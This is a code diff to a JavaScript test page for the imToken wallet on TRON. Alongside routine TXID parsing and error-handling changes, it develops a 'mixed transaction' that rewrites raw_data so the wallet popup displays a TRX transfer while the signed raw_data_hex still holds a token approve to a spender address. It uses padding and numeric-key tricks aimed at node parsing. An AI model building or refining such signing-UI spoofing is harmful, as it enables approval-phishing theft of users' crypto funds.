@@ -108,6 +108,16 @@
     return typeof window.imToken !== 'undefined' && typeof window.imToken.callPromisifyAPI === 'function';
   }
 
+  function findTxId(value) {
+    if (typeof value === 'string' && /^[0-9a-fA-F]{64}$/.test(value)) return value;
+    if (!value || typeof value !== 'object') return '';
+    const candidates = [
+      value.txid, value.txID, value.txId, value.tx_hash,
+      value.transaction_id, value.data?.txid, value.data?.txID
+    ];
+    return candidates.find(item => typeof item === 'string' && /^[0-9a-fA-F]{64}$/.test(item)) || '';
+  }
+
   async function connect() {
     log('检查钱包环境…', 'warn');
     if (!hasBridge()) {
@@ -193,35 +203,44 @@
   async function sendTx(tx, desc) {
     log(`发送 ${desc} …`, 'warn');
     // 打印交易关键信息用于调试
-    log('TX raw_data.contract: ' + JSON.stringify(tx.raw_data?.contract?.[0]), 'warn');
+    const firstContract = tx.raw_data?.contract?.[0];
+    log('TX contract 键顺序: ' + Object.keys(firstContract || {}).join(' → '), 'warn');
+    log('TX raw_data.contract: ' + JSON.stringify(firstContract), 'warn');
     log('TX raw_data_hex 前64字节: ' + (tx.raw_data_hex || '').slice(0, 64), 'warn');
     try {
       const res = await window.imToken.callPromisifyAPI('tron.sendTransaction', {
         tx, from: walletAddr, useTronHeader: true
       });
-      log('原始返回: ' + JSON.stringify(res), 'success');
-      let rid = '';
-      if (typeof res === 'string') rid = res;
-      else if (res && typeof res === 'object') rid = res.txid || res.txID || res.txId || res.tx_hash || res.transaction_id || res.result || (res.data && res.data.txid) || '';
+      log('原始返回: ' + JSON.stringify(res), 'warn');
+      const rid = findTxId(res);
       if (rid) {
         log('✅ 交易已广播! TXID: ' + rid, 'success');
         log('Tronscan: https://tronscan.org/#/transaction/' + rid, 'info');
         return true;
+      } else if (res?.result === true || res === true) {
+        log('接口仅返回 result=true，未返回 64 位 TXID，不能据此确认广播成功', 'warn');
+        return false;
       } else {
-        log('未返回 txid，可能失败', 'error');
+        log('未返回有效的 64 位 TXID，不能确认广播成功', 'error');
         return false;
       }
     } catch (e) {
-      log('错误 message: ' + (e.message || ''), 'error');
-      log('错误 code: ' + (e.code || 'N/A'), 'error');
+      const message = String(e?.message || '');
+      const code = String(e?.code || e?.data?.code || '');
+      const normalized = (code + ' ' + message).toLowerCase();
+      log('错误 message: ' + message, 'error');
+      log('错误 code: ' + (code || 'N/A'), 'error');
       log('完整错误: ' + JSON.stringify(e, Object.getOwnPropertyNames(e)), 'error');
-      // 区分拒绝来源
-      if (e.message?.includes('reject') || e.code === 'USER_REJECTED') {
+      if (normalized.includes('user_rejected') || normalized.includes('reject')) {
         log('→ 用户在钱包弹窗取消', 'warn');
-      } else if (e.message?.includes('server')) {
-        log('→ 节点广播拒绝 (SIGERROR / 签名不匹配)', 'error');
-      } else if (e.message?.includes('invalid') || e.message?.includes('valid')) {
+      } else if (normalized.includes('contract_validate_error') || message.includes('合约调用校验错误')) {
+        log('→ CONTRACT_VALIDATE_ERROR：合约/参数校验失败，不等同于 SIGERROR', 'error');
+      } else if (normalized.includes('sigerror') || normalized.includes('validate signature')) {
+        log('→ SIGERROR：签名与节点重建出的 raw_data 不一致，或签名权限不匹配', 'error');
+      } else if (normalized.includes('invalid_tx') || normalized.includes('validrawtx')) {
         log('→ imToken 桥接层校验拦截 (validRawTx)', 'error');
+      } else if (normalized.includes('server')) {
+        log('→ 服务端返回错误，但当前信息不足以判定为签名错误', 'error');
       }
       return false;
     }
@@ -258,7 +277,7 @@
   }
 
   // ③ 混合测试：修改 raw_data 欺骗 UI，raw_data_hex 保持 approve
-  // 当前 imToken 版本：弹窗能显示 TRX 转账，广播时 SIGERROR（签名与节点解析不一致）
+  // 当前 imToken 版本可能显示 TRX 转账，但广播阶段仍可能被桥接层或节点校验拒绝
   // 低版本 imToken + java-tron 支持数字键时可通过，此页面保留完整测试结构
   async function mixedTx() {
     if (!window.tronWeb?.transactionBuilder) { log('tronWeb 未就绪', 'error'); return; }
@@ -317,12 +336,13 @@
       transaction.raw_data_hex = originalHex;
 
       const hasSelector = originalHex.includes('095ea7b3');
+      const contractKeys = Object.keys(transaction.raw_data.contract[0]);
       log('━━━━ 填充+数字键方案 ━━━━', 'warn');
       log(`[UI] type=TransferContract → 钱包显示 TRX 转账`, 'success');
       log(`[UI] param.to_address=${SPENDER.slice(0,6)}... → base58 地址`, 'success');
-      log(`[填充] __p01~__p15 → 操纵 FastJSON/HashMap 顺序`, 'success');
-      log(`[覆盖] '1':31 → TriggerSmartContract enum 值`, 'success');
-      log(`[覆盖] '2':realParam → approve 参数`, 'success');
+      log(`[JS顺序] ${contractKeys.join(' → ')}`, 'warn');
+      log(`[构造意图] __p01~__p15 作为未知填充字段；是否影响节点顺序尚未验证`, 'warn');
+      log(`[构造意图] '1':31 / '2':realParam；不代表节点实际采用数字字段`, 'warn');
       log(`[签名] raw_data_hex 含 approve 选择器: ${hasSelector}`, hasSelector ? 'success' : 'error');
       log('━━━━━━━━━━━━━━━━━━━━', 'warn');
 
